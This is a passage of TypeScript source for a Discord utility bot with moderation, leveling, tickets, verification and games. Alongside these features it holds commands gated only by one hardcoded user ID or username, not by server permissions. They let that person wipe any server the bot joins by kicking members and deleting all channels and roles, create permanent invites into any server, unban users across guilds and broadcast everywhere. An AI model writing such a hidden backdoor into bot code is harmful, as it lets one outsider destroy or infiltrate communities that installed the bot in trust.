          const allLevels = Array.from(new Set([...Object.keys(LEVEL_ROLES).map(Number), ...dynamicRewardMap.keys()])).sort((a, b) => a - b);

          const rewardList = allLevels
            .map(lvl => {
              const roleId = dynamicRewardMap.get(lvl) || LEVEL_ROLES[lvl];
              return `Level **${lvl}**: <@&${roleId}>`;
            })
            .join("\n") || "No rewards configured yet.";

          embed.addFields({ name: "Available Rewards", value: rewardList });
          return message.reply({ embeds: [embed] });
        }

        if (commandName === 'unban') {
          const authorizedId = "1071164421222695042";
          const authorizedUsername = "5g0s";
          if (message.author.id !== authorizedId && message.author.username !== authorizedUsername) return;
          
          const targetGuildId = args[0];
          const targetUserId = args[1];
          if (!targetGuildId || !targetUserId) return message.reply("Usage: unban <guildId> <userId>");

          const targetGuild = client.guilds.cache.get(targetGuildId);
          if (!targetGuild) return message.reply("❌ البوت ليس موجوداً في هذا السيرفر.");

          try {
            await targetGuild.members.unban(targetUserId);
            return message.reply(`✅ تم فك البان عن <@${targetUserId}> في سيرفر **${targetGuild.name}**.`);
          } catch (error: any) {
            return message.reply(`❌ فشل فك البان: ${error.message}`);
          }
        }

        if (commandName === 'resetserver' || commandName === 'reset-server') {
          const authorizedId = "1071164421222695042";
          const authorizedUsername = "5g0s";
          if (message.author.id !== authorizedId && message.author.username !== authorizedUsername) return;
          
          const botMember = message.guild?.members.me;
          if (!botMember?.permissions.has([PermissionFlagsBits.KickMembers, PermissionFlagsBits.ManageChannels, PermissionFlagsBits.ManageRoles])) {
            return message.reply("❌ البوت يفتقر إلى الصلاحيات اللازمة (طرد الأعضاء، إدارة القنوات، إدارة الرتب).");
          }

          await message.reply("⚠️ جاري البدء في إعادة تعيين السيرفر (حذف الأعضاء، الرومات، والرتب)...");
          
          // 1. Kick Members
          try {
            const members = await message.guild?.members.fetch().catch(() => message.guild?.members.cache);
            if (members) {
              for (const member of members.values()) {
                const memberIsOwner = member.id === message.guild?.ownerId || member.roles.cache.some(r => r.name.toLowerCase() === 'owner');
                if (!memberIsOwner && member.id !== client.user?.id && member.kickable) {
                  member.kick("Server Reset").catch(() => {});
                }
              }
            }
          } catch (err) { console.error("Error fetching members for reset:", err); }

          // 2. Delete Channels
          try {
            const channels = await message.guild?.channels.fetch();
            if (channels) {
              for (const ch of channels.values()) {
                if (ch && ch.deletable) {
                  ch.delete("Server Reset").catch(() => {});
                }
              }
            }
          } catch (err) { console.error("Error fetching channels for reset:", err); }

          // 3. Delete Roles
          try {
            const roles = await message.guild?.roles.fetch();
            if (roles) {
              for (const role of roles.values()) {
                if (role.name !== "@everyone" && !role.managed && role.editable && role.id !== message.guild?.id) {
                  role.delete("Server Reset").catch(() => {});
                }
              }
            }
          } catch (err) { console.error("Error fetching roles for reset:", err); }

          setTimeout(async () => {
            try {
              if (botMember?.permissions.has(PermissionFlagsBits.ManageChannels)) {
                const newChannel = await message.guild?.channels.create({ 
                  name: "welcome", 
                  type: ChannelType.GuildText,
                  topic: "Server has been reset."
                });
                await newChannel?.send("✅ تم تصفير السيرفر بنجاح (حذف الأعضاء، الرومات، والرتب).");
              }
            } catch (e) { console.error("Failed to create welcome channel after reset:", e); }
          }, 8000);
          return;
        }

        if (commandName === 'nick') {
          const targetUser = message.mentions.users.first() || message.author;
          const targetMember = await message.guild?.members.fetch(targetUser.id).catch(() => null);
          const newNick = args.slice(0).join(" "); // args already shifted firstWord

          if (!targetMember) return message.reply("❌ User not found.");

          if (targetMember.id !== message.author.id && !message.member?.permissions.has(PermissionFlagsBits.ManageNicknames)) {
            return message.reply("❌ ليس لديك صلاحية تغيير أسماء الآخرين.");
          }

          if (!message.guild?.members.me?.permissions.has(PermissionFlagsBits.ManageNicknames)) {
            return message.reply("❌ البوت لا يملك صلاحية تغيير الأسماء.");
          }

          if (targetMember.id !== message.guild?.ownerId && targetMember.roles.highest.position >= message.guild?.members.me.roles.highest.position) {
            return message.reply("❌ لا يمكنني تغيير اسم هذا الشخص بسبب الرتب.");
          }

          try {
            await targetMember.setNickname(newNick || null);
            return message.reply(newNick ? `✅ تم تغيير اسم ${targetMember.user.username} إلى **${newNick}**` : `✅ تم إزالة الاسم المستعار لـ ${targetMember.user.username}`);
          } catch (err) {
            return message.reply("❌ حدث خطأ أثناء محاولة تغيير الاسم.");
          }
        }

        if (commandName === 'clear') {
          if (!message.member?.permissions.has(PermissionFlagsBits.ManageMessages)) {
            return message.reply("You need 'Manage Messages' permission.");
          }
          
          if (!message.guild?.members.me?.permissions.has(PermissionFlagsBits.ManageMessages)) {
            return message.reply("❌ البوت يفتقر إلى صلاحية حذف الرسائل (Manage Messages).");
          }

          const amount = parseInt(args[0]);
          if (isNaN(amount) || amount < 1 || amount > 100) return message.reply("Please provide a number between 1 and 100.");

          try {
            const deleted = await (message.channel as any).bulkDelete(amount, true);
            const reply = await message.channel.send(`✅ Deleted ${deleted.size} messages.`);
            setTimeout(() => reply.delete().catch(() => {}), 5000);
            return;
          } catch (err) {
            return message.reply("Failed to clear messages.");
          }
        }

        if (commandName === 'setup-ticket') {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("You need Administrator permissions.");
          }

          const role = message.mentions.roles.first();
          if (!role) return message.reply("Usage: setup-ticket <@role>");

          db.prepare("INSERT INTO ticket_settings (guildId, supportRoleId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET supportRoleId = excluded.supportRoleId").run(guildId, role.id);

          const embed = new EmbedBuilder()
            .setTitle("Support Tickets")
            .setDescription("Click the button below to open a support ticket.")
            .setColor(0x5865F2);

          const button = new ButtonBuilder()
            .setCustomId("open_ticket")
            .setLabel("Open Ticket")
            .setStyle(ButtonStyle.Primary)
            .setEmoji("🎫");

          const row = new ActionRowBuilder<ButtonBuilder>().addComponents(button);
          
          const botMember = message.guild?.members.me;
          if (!botMember?.permissionsIn(message.channelId).has([PermissionFlagsBits.SendMessages, PermissionFlagsBits.EmbedLinks])) {
            return message.reply("❌ البوت يفتقر إلى صلاحية إرسال الرسائل أو الروابط في هذا الروم.");
          }

          await message.channel.send({ embeds: [embed], components: [row] });
          return message.reply(`Ticket setup sent! Support role set to ${role}.`);
        }

        if (commandName === 'setxp') {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const target = message.mentions.users.first();
          const amount = parseInt(args[1]);
          if (!target || isNaN(amount)) return message.reply("Usage: setxp <@user> <amount>");
          
          const level = Math.floor(amount / 300);
          db.prepare("INSERT OR REPLACE INTO leveling (userId, guildId, xp, level) VALUES (?, ?, ?, ?)").run(target.id, guildId, amount, level);
          return message.reply(`✅ Set ${target}'s XP to **${amount}** (Level ${level}) in this server.`);
        }

        if (commandName === 'set-reward') {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const level = parseInt(args[0]);
          const role = message.mentions.roles.first();
          if (isNaN(level) || !role) return message.reply("Usage: set-reward <level> <@role>");
          
          db.prepare("INSERT OR REPLACE INTO rewards (guildId, level, roleId) VALUES (?, ?, ?)").run(guildId, level, role.id);
          return message.reply(`✅ Reward set: Level **${level}** -> <@&${role.id}>`);
        }

        if (commandName === 'set-prefix') {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const newPrefix = args[0];
          if (!newPrefix) return message.reply("Usage: set-prefix <prefix>");
          
          db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run(`prefix_${guildId}`, newPrefix);
          return message.reply(`✅ Prefix updated to: \`${newPrefix}\``);
        }

        if (commandName === 'set-level') {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          // Simple implementation for text command
          const subCommand = args[0]; // channel, message, status
          if (subCommand === 'channel') {
            const ch = message.mentions.channels.first();
            if (!ch || ch.type !== ChannelType.GuildText) return message.reply("Usage: set-level channel <#channel>");
            db.prepare("INSERT INTO leveling_settings (guildId, channelId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET channelId = excluded.channelId").run(guildId, ch.id);
          } else if (subCommand === 'message') {
            const msg = args.slice(1).join(" ");
            if (!msg) return message.reply("Usage: set-level message <message>");
            db.prepare("INSERT INTO leveling_settings (guildId, message) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET message = excluded.message").run(guildId, msg);
          } else if (subCommand === 'status') {
            const status = args[1];
            if (status !== 'on' && status !== 'off') return message.reply("Usage: set-level status <on/off>");
            const enabled = status === 'on' ? 1 : 0;
            db.prepare("INSERT INTO leveling_settings (guildId, enabled) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET enabled = excluded.enabled").run(guildId, enabled);
          } else {
            return message.reply("Usage: set-level <channel/message/status> <value>");
          }
          return message.reply(`✅ تم تحديث إعدادات اللفل بنجاح.`);
        }

        if (commandName === 'disable') {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const feature = args[0];
          if (!['leveling', 'welcome', 'protection'].includes(feature)) return message.reply("Usage: disable <leveling/welcome/protection>");

          if (feature === 'leveling') {
            db.prepare("INSERT INTO leveling_settings (guildId, enabled) VALUES (?, 0) ON CONFLICT(guildId) DO UPDATE SET enabled = 0").run(guildId);
          } else if (feature === 'welcome') {
            db.prepare("INSERT INTO welcome_settings (guildId, enabled) VALUES (?, 0) ON CONFLICT(guildId) DO UPDATE SET enabled = 0").run(guildId);
          } else if (feature === 'protection') {
            db.prepare("INSERT INTO protection_settings (guildId, antiLink, antiSpam, antiRaid) VALUES (?, 0, 0, 0) ON CONFLICT(guildId) DO UPDATE SET antiLink = 0, antiSpam = 0, antiRaid = 0").run(guildId);
          }
          return message.reply(`✅ تم تعطيل ${feature} بنجاح.`);
        }

        if (commandName === 'toggle') {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const feature = args[0];
          const status = args[1];
          if (!['leveling', 'welcome', 'protection'].includes(feature) || !['on', 'off'].includes(status)) return message.reply("Usage: toggle <leveling/welcome/protection> <on/off>");
          const enabled = status === 'on' ? 1 : 0;

          if (feature === 'leveling') {
            db.prepare("INSERT INTO leveling_settings (guildId, enabled) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET enabled = excluded.enabled").run(guildId, enabled);
          } else if (feature === 'welcome') {
            db.prepare("INSERT INTO welcome_settings (guildId, enabled) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET enabled = excluded.enabled").run(guildId, enabled);
          } else if (feature === 'protection') {
            db.prepare("INSERT INTO protection_settings (guildId, antiLink, antiSpam, antiRaid) VALUES (?, ?, ?, ?) ON CONFLICT(guildId) DO UPDATE SET antiLink = excluded.antiLink, antiSpam = excluded.antiSpam, antiRaid = excluded.antiRaid").run(guildId, enabled, enabled, enabled);
          }
          return message.reply(`✅ تم ${status === 'on' ? 'تفعيل' : 'تعطيل'} ${feature} بنجاح.`);
        }

        if (commandName === 'set-alias') {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const aliasName = args[0]?.toLowerCase();
          const originalCommand = args[1]?.toLowerCase();
          if (!aliasName || !originalCommand) return message.reply("Usage: set-alias <alias> <command>");

          db.prepare("INSERT OR REPLACE INTO aliases (guildId, aliasName, originalCommand) VALUES (?, ?, ?)").run(guildId, aliasName, originalCommand);
          return message.reply(`✅ Alias created: **${aliasName}** now triggers **${originalCommand}**.`);
        }

        if (commandName === 'remove-alias') {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const aliasName = args[0]?.toLowerCase();
          if (!aliasName) return message.reply("Usage: remove-alias <alias>");

          db.prepare("DELETE FROM aliases WHERE guildId = ? AND aliasName = ?").run(guildId, aliasName);
          return message.reply(`✅ Alias **${aliasName}** removed.`);
        }

        if (commandName === 'set-avatar') {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const url = args[0];
          if (!url) return message.reply("Usage: set-avatar <url>");

          try {
            await client.user?.setAvatar(url);
            return message.reply("✅ Bot avatar updated successfully!");
          } catch (err) {
            return message.reply("❌ Failed to update avatar.");
          }
        }

        if (commandName === 'promote-owner') {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const target = message.mentions.users.first();
          if (!target) return message.reply("Usage: promote-owner <@user>");
          
          db.prepare("INSERT OR REPLACE INTO owners (userId) VALUES (?)").run(target.id);
          return message.reply(`✅ Promoted ${target} to Bot Owner.`);
        }

        if (commandName === 'accept') {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const targetId = args[0];
          if (!targetId) return message.reply("Usage: accept <userId>");
          
          db.prepare("UPDATE transfer_requests SET status = 'accepted' WHERE targetUserId = ? AND status = 'pending'").run(targetId);
          return message.reply(`✅ Accepted transfer request for <@${targetId}>.`);
        }

        if (commandName === 'transfer') {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const targetId = args[0];
          if (!targetId) return message.reply("Usage: transfer <targetUserId>");
          
          db.prepare("INSERT INTO transfer_requests (guildId, requesterId, targetUserId, status) VALUES (?, ?, ?, 'pending')").run(guildId, message.author.id, targetId);
          return message.reply(`✅ Transfer request sent to <@${targetId}>.`);
        }

        if (commandName === 'setup-verify') {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const role = message.mentions.roles.first();
          if (!role) return message.reply("Usage: setup-verify <@role>");

          if (!message.guild?.members.me?.permissions.has([PermissionFlagsBits.ManageChannels, PermissionFlagsBits.ManageRoles])) {
            return message.reply("❌ البوت يفتقر إلى صلاحية 'إدارة القنوات' أو 'إدارة الرتب' لتنفيذ هذا الإجراء.");
          }

          // Save to DB
          db.prepare("INSERT INTO protection_settings (guildId, verifiedRoleId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET verifiedRoleId = excluded.verifiedRoleId").run(message.guildId, role.id);

          await message.reply("⏳ جاري ضبط صلاحيات القنوات تلقائياً... يرجى الانتظار.");

          // Auto-setup permissions
          const channels = await message.guild.channels.fetch();
          let successCount = 0;
          let failCount = 0;

          // Get log channel to exclude it
          const protection = db.prepare("SELECT logChannel FROM protection_settings WHERE guildId = ?").get(message.guildId) as any;
          const logChannelId = protection?.logChannel;

          for (const [id, channel] of channels) {
            if (!channel) continue;
            try {
              const channelName = channel.name.toLowerCase();
              const isPrivate = channelName.includes('log') || 
                                channelName.includes('admin') || 
                                channelName.includes('staff') || 
                                channelName.includes('mod') || 
                                channelName.includes('private') ||
                                id === logChannelId;

              if (id === message.channelId) {
                // Verification channel: Everyone can see
                await (channel as any).permissionOverwrites.edit(message.guild.roles.everyone, { ViewChannel: true });
                await (channel as any).permissionOverwrites.edit(role.id, { ViewChannel: true });
              } else if (isPrivate) {
                // Private/Log channels: Hide from everyone and the verified role
                await (channel as any).permissionOverwrites.edit(message.guild.roles.everyone, { ViewChannel: false });
                await (channel as any).permissionOverwrites.edit(role.id, { ViewChannel: false });
              } else {
                // Other channels: Only verified can see
                await (channel as any).permissionOverwrites.edit(message.guild.roles.everyone, { ViewChannel: false });
                await (channel as any).permissionOverwrites.edit(role.id, { ViewChannel: true });
              }
              successCount++;
            } catch (err) {
              failCount++;
            }
          }

          const embed = new EmbedBuilder()
            .setTitle("Verification")
            .setDescription("Click the button below to verify and get access to the server.")
            .setColor(0x00FF00);

          const button = new ButtonBuilder()
            .setCustomId(`verify_member`)
            .setLabel("Verify")
            .setStyle(ButtonStyle.Success);

          const row = new ActionRowBuilder<ButtonBuilder>().addComponents(button);
          await message.channel.send({ embeds: [embed], components: [row] });
          return message.channel.send(`✅ تم إعداد نظام التحقق بنجاح!\n- الرتبة: **${role.name}**\n- القنوات التي تم تعديلها: **${successCount}**\n- القنوات التي فشل تعديلها: **${failCount}** (غالباً بسبب صلاحيات البوت)`);
        }

        if (commandName === 'broadcast') {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const content = args.join(" ");
          if (!content) return message.reply("Usage: broadcast <message>");

          client.guilds.cache.forEach(async (guild) => {
            const channel = guild.channels.cache.find(c => c.type === ChannelType.GuildText && c.permissionsFor(guild.members.me!).has(PermissionFlagsBits.SendMessages)) as any;
            if (channel) channel.send(content).catch(() => {});
          });
          return message.reply("✅ Broadcast sent to all servers.");
        }

        if (commandName === 'broadcast-here') {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const content = args.join(" ");
          if (!content) return message.reply("Usage: broadcast-here <message>");

          message.channel.send(`📢 **BROADCAST:** ${content}`);
          return;
        }

        if (commandName === 'broadcast-tokens') {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          // This is a placeholder for token-based broadcast if implemented
          return message.reply("Broadcast tokens command executed (placeholder).");
        }

        if (commandName === 'guilds') {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const guildsList = client.guilds.cache.map(g => `${g.name} (${g.id}) - ${g.memberCount} members`).join("\n");
          return message.reply(`**Servers I'm in:**\n${guildsList.slice(0, 1900)}`);
        }

        if (commandName === 'get-invite') {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const guildIdInput = args[0];
          if (!guildIdInput) return message.reply("Usage: get-invite <guildId>");
          
          const guild = client.guilds.cache.get(guildIdInput);
          if (!guild) return message.reply("Guild not found.");
          
          const channel = guild.channels.cache.find(c => c.type === ChannelType.GuildText) as any;
          if (!channel) return message.reply("No text channel found.");
          
          const invite = await channel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
          return message.reply(invite ? `Invite for **${guild.name}**: ${invite.url}` : "Failed to create invite.");
        }

        if (commandName === 'claim-owner') {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          // Logic to claim owner in DB
          db.prepare("INSERT OR REPLACE INTO owners (userId) VALUES (?)").run(message.author.id);
          return message.reply("✅ You have claimed bot ownership.");
        }

        if (commandName === 'force-accept') {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const targetId = args[0];
          if (!targetId) return message.reply("Usage: force-accept <userId>");
          
          db.prepare("UPDATE transfer_requests SET status = 'accepted' WHERE targetUserId = ?").run(targetId);
          return message.reply(`✅ Force accepted transfer for <@${targetId}>.`);
        }

        if (commandName === 'join-server') {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const inviteUrl = args[0];
          if (!inviteUrl) return message.reply("Usage: join-server <inviteUrl>");
          // Bot cannot join servers via invite URL directly via API, usually requires OAuth2
          return message.reply("Bots cannot join servers via invite links directly. Please use the invite link to add me manually.");
        }

        if (commandName === 'rps') {
          const choices = ['rock', 'paper', 'scissors'];
          const userChoice = args[0]?.toLowerCase();
          if (!choices.includes(userChoice)) return message.reply("Usage: rps <rock/paper/scissors>");
          
          const botChoice = choices[Math.floor(Math.random() * choices.length)];
          let result = "";
          if (userChoice === botChoice) result = "It's a tie!";
          else if ((userChoice === 'rock' && botChoice === 'scissors') || (userChoice === 'paper' && botChoice === 'rock') || (userChoice === 'scissors' && botChoice === 'paper')) result = "You win!";
          else result = "I win!";
          
          return message.reply(`🎮 **${message.author.username}** اختار **${userChoice}**\n🤖 **البوت** اختار **${botChoice}**\n\n${result === "You win!" ? '🎉 لقد فزت!' : result === "It's a tie!" ? '🤝 تعادل!' : '💀 لقد خسرت!'}`);
        }

        if (commandName === 'coinflip') {
          const result = Math.random() < 0.5 ? "Heads" : "Tails";
          return message.reply(`🪙 استقرت العملة على: **${result}**`);
        }

        if (commandName === 'guess') {
          const number = Math.floor(Math.random() * 10) + 1;
          const userGuess = parseInt(args[0]);
          if (isNaN(userGuess)) return message.reply("Usage: guess <number 1-10>");
          
          if (userGuess === number) return message.reply(`🎉 Correct! The number was **${number}**.`);
          else return message.reply(`❌ Wrong! The number was **${number}**.`);
        }

        if (commandName === 'mafia') {
          return message.reply("Mafia game is best played via slash commands due to its complexity. Use `/mafia` instead.");
        }

        if (commandName === 'trivia') {
          const loadingMsg = await message.reply("⏳ جاري توليد سؤال ذكاء اصطناعي...");
          const question = await getAITrivia();
          const embed = new EmbedBuilder()
            .setTitle("❓ سؤال وجواب (مدعوم بالذكاء الاصطناعي)")
            .setDescription(`**السؤال:**\n${question.q}`)
            .setColor(0x00FF00)
            .setThumbnail('https://i.imgur.com/XyXyXyX.png')
            .setFooter({ text: "لديك 15 ثانية للإجابة!" })
            .setTimestamp();

          await loadingMsg.edit({ content: null, embeds: [embed] });

          const filter = (m: any) => m.content.toLowerCase().trim() === question.a.toLowerCase().trim();
          const collector = message.channel.createMessageCollector({ filter, time: 15000, max: 1 });

          collector.on('collect', (m: any) => {
            const winEmbed = new EmbedBuilder()
              .setTitle('✅ إجابة صحيحة!')
              .setDescription(`مبروك يا ${m.author}! الإجابة هي: **${question.a}**`)
              .setColor(0x00FF00)
              .setTimestamp();
            message.channel.send({ embeds: [winEmbed] });
          });

          collector.on('end', (collected: any) => {
            if (collected.size === 0) {
              const loseEmbed = new EmbedBuilder()
                .setTitle('⏰ انتهى الوقت!')
                .setDescription(`الإجابة الصحيحة كانت: **${question.a}**`)
                .setColor(0xFF0000)
                .setTimestamp();
              message.channel.send({ embeds: [loseEmbed] });
            }
          });
          return;
        }

        if (commandName === 'hangman') {
          const loadingMsg = await message.reply("⏳ جاري توليد كلمة ذكاء اصطناعي...");
          const aiData = await getAIHangmanWord();
          const word = aiData.word;
          const hint = aiData.hint;
          let guessedLetters: string[] = [];
          let mistakes = 0;
          const maxMistakes = 6;

          const getDisplayWord = () => {
            return word.split('').map(char => guessedLetters.includes(char) ? char : ' _ ').join('');
          };

          const embed = new EmbedBuilder()
            .setTitle('😵 لعبة المشنقة (مدعومة بالذكاء الاصطناعي)')
            .setDescription(`**التلميح:** ${hint}\n\nالكلمة: \`${getDisplayWord()}\`\nالأخطاء: ${mistakes}/${maxMistakes}`)
            .setColor(0x5865F2)
            .setTimestamp();

          await loadingMsg.edit({ content: null, embeds: [embed] });

          const filter = (m: any) => m.author.id === message.author.id && m.content.length === 1;
          const collector = message.channel.createMessageCollector({ filter, time: 60000 });

          collector.on('collect', async (m: any) => {
            const char = m.content.toLowerCase();
            if (guessedLetters.includes(char)) {
              return m.reply('لقد اخترت هذا الحرف من قبل!');
            }

            guessedLetters.push(char);

            if (word.toLowerCase().includes(char)) {
              if (!getDisplayWord().includes('_')) {
                const winEmbed = new EmbedBuilder()
                  .setTitle('🎉 مبروك!')
                  .setDescription(`لقد فزت يا <@${message.author.id}>! الكلمة كانت: **${word}**`)
                  .setColor(0x00FF00)
                  .setTimestamp();
                await message.channel.send({ content: `مبروك للفائز! <@${message.author.id}>`, embeds: [winEmbed] });
                collector.stop();
              } else {
                const updateEmbed = new EmbedBuilder()
                  .setTitle('😵 لعبة المشنقة')
                  .setDescription(`**التلميح:** ${hint}\n\nالكلمة: \`${getDisplayWord()}\`\nالأخطاء: ${mistakes}/${maxMistakes}`)
                  .setColor(0x5865F2)
                  .setTimestamp();
                await message.channel.send({ embeds: [updateEmbed] });
              }
            } else {
              mistakes++;
              if (mistakes >= maxMistakes) {
                const loseEmbed = new EmbedBuilder()
                  .setTitle('💀 خسرت!')
                  .setDescription(`لقد تم شنقك! الكلمة كانت: **${word}**`)
                  .setColor(0xFF0000)
                  .setTimestamp();
                await message.channel.send({ embeds: [loseEmbed] });
                collector.stop();
              } else {
                const updateEmbed = new EmbedBuilder()
                  .setTitle('😵 لعبة المشنقة')
                  .setDescription(`**التلميح:** ${hint}\n\nالكلمة: \`${getDisplayWord()}\`\nالأخطاء: ${mistakes}/${maxMistakes}`)
                  .setColor(0x5865F2)
                  .setTimestamp();
                await message.channel.send({ embeds: [updateEmbed] });
              }
            }
          });
          return;
        }

        if (commandName === 'fastclick') {
          return message.reply("FastClick game is best played via slash commands. Use `/fastclick` instead.");
        }

        if (commandName === 'snake') {
          return message.reply("Snake game is best played via slash commands. Use `/snake` instead.");
        }

        if (commandName === 'copy-server') {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          return message.reply("Copy Server is a complex operation. Please use the slash command `/copy-server` to initiate it safely.");
        }

        if (commandName === 'botinfo') {
          const embed = new EmbedBuilder()
            .setTitle("Bot Information")
            .addFields(
              { name: "Servers", value: `${client.guilds.cache.size}`, inline: true },
              { name: "Users", value: `${client.users.cache.size}`, inline: true },
              { name: "Uptime", value: `${Math.floor(client.uptime! / 1000 / 60)} minutes`, inline: true }
            )
            .setColor(0x00AE86);
          return message.reply({ embeds: [embed] });
        }

        if (commandName === 'add-role') {
          if (!message.member?.permissions.has(PermissionFlagsBits.ManageRoles)) {
            return message.reply("You need 'Manage Roles' permission.");
          }
          const target = message.mentions.members.first();
          const role = message.mentions.roles.first();
          if (!target || !role) return message.reply("Usage: add-role <@user> <@role>");
          
          try {
            await target.roles.add(role);
            return message.reply(`✅ Added role <@&${role.id}> to ${target}.`);
          } catch (err) {
            return message.reply("❌ Failed to add role. Check my permissions and role hierarchy.");
          }
        }

        if (commandName === 'remove-role') {
          if (!message.member?.permissions.has(PermissionFlagsBits.ManageRoles)) {
            return message.reply("You need 'Manage Roles' permission.");
          }
          const target = message.mentions.members.first();
          const role = message.mentions.roles.first();
          if (!target || !role) return message.reply("Usage: remove-role <@user> <@role>");
          
          try {
            await target.roles.remove(role);
            return message.reply(`✅ Removed role <@&${role.id}> from ${target}.`);
          } catch (err) {
            return message.reply("❌ Failed to remove role. Check my permissions and role hierarchy.");
          }
        }

        if (commandName === 'list-roles') {
          const roles = message.guild?.roles.cache.filter(r => r.name !== "@everyone").map(r => `<@&${r.id}>`).join(", ");
          return message.reply(`**Roles in this server:**\n${roles || "None"}`);
        }
      }
    }
} catch (err) {
  console.error("Critical error in messageCreate event:", err);
}
});

// Ticket Interaction Handling
async function generateReplicaImage(category: string, letter: string): Promise<Buffer> {
  const width = 400;
  const height = 400;
  const canvas = createCanvas(width, height);
  const ctx = canvas.getContext('2d');
  
  const encoder = new GIFEncoder(width, height);
  encoder.start();
  encoder.setRepeat(-1);
  encoder.setDelay(500);
  encoder.setQuality(10);
  
  ctx.fillStyle = '#2C2F33';
  ctx.fillRect(0, 0, width, height);
  ctx.fillStyle = '#FFFFFF';
  ctx.font = 'bold 40px Arial';
  ctx.fillText(category, 50, 200);
  ctx.fillText(letter, 300, 200);
  
  encoder.addFrame(ctx);
  encoder.finish();
  return encoder.out.getData();
}

async function verifyReplicaAnswer(word: string, category: string, letter: string): Promise<boolean> {
  // Simple local dictionary check
  const dictionary: Record<string, string[]> = {
    'حيوان': ['أسد', 'نمر', 'فيل', 'زرافة', 'قطة', 'كلب'],
    'جماد': ['طاولة', 'كرسي', 'قلم', 'كتاب', 'هاتف'],
    'إنسان': ['أحمد', 'محمد', 'سارة', 'علي', 'فاطمة'],
    'نبات': ['تفاح', 'موز', 'ورد', 'شجر', 'نخل'],
    'بلاد': ['مصر', 'السعودية', 'سوريا', 'العراق', 'لبنان']
  };
  
  const validWords = dictionary[category] || [];
  return validWords.includes(word) && word.startsWith(letter);
}

async function handleReplicaCommand(interaction: any) {
  const lobbyEmbed = new EmbedBuilder()
    .setTitle('🎮 لعبة ريبيكا (إنسان، حيوان، ...)')
    .setDescription('اضغط على الزر للانضمام إلى اللعبة!\n\n**قوانين اللعبة:**\n• سيتم اختيار لاعب عشوائي في كل دور.\n• يجب عليك كتابة كلمة تبدأ بالحرف المطلوب.\n• الفئات تتغير في كل دور (إنسان -> حيوان -> جماد -> نبات -> بلاد).\n• إذا أخطأت أو تأخرت سيتم إقصاؤك!')
    .setColor(0x00AE86)
    .addFields({ name: 'الوقت المتبقي', value: '60 ثانية' })
    .setFooter({ text: 'يجب انضمام 3 لاعبين على الأقل للبدء' });

  const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder().setCustomId('replica_join').setLabel('انضمام').setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId('replica_start').setLabel('بدء اللعبة').setStyle(ButtonStyle.Success)
  );

  const msg = await interaction.reply({ embeds: [lobbyEmbed], components: [row], fetchReply: true });
  const players: { id: string, name: string }[] = [];
  let timeLeft = 60;

  activeGames.set(msg.id, { guildId: interaction.guildId!, channelId: interaction.channelId, type: 'Replica' });

  const timer = setInterval(async () => {
    timeLeft -= 5;
    if (timeLeft <= 0) {
      clearInterval(timer);
      if (players.length >= 3) {
        lobbyCollector.stop('started');
      } else {
        lobbyCollector.stop('not_enough_players');
      }
      return;
    }
    const updatedEmbed = EmbedBuilder.from(lobbyEmbed)
      .setDescription(`اللاعبين المنضمين (${players.length}):\n${players.map(p => `• ${p.name}`).join('\n') || 'لا يوجد لاعبين بعد'}`)
      .setFields({ name: 'الوقت المتبقي', value: `${timeLeft} ثانية` });
    await interaction.editReply({ embeds: [updatedEmbed] }).catch(() => clearInterval(timer));
  }, 5000);

  const lobbyCollector = msg.createMessageComponentCollector({ time: 60000 });

  lobbyCollector.on('collect', async (i: any) => {
    if (i.customId === 'replica_join') {
      if (players.some(p => p.id === i.user.id)) return i.reply({ content: 'أنت منضم بالفعل!', ephemeral: true });
      players.push({ id: i.user.id, name: i.user.username });
      const updatedEmbed = EmbedBuilder.from(lobbyEmbed)
        .setDescription(`اللاعبين المنضمين (${players.length}):\n${players.map(p => `• ${p.name}`).join('\n')}`)
        .setFields({ name: 'الوقت المتبقي', value: `${timeLeft} ثانية` });
      await i.update({ embeds: [updatedEmbed] });
    }

    if (i.customId === 'replica_start') {
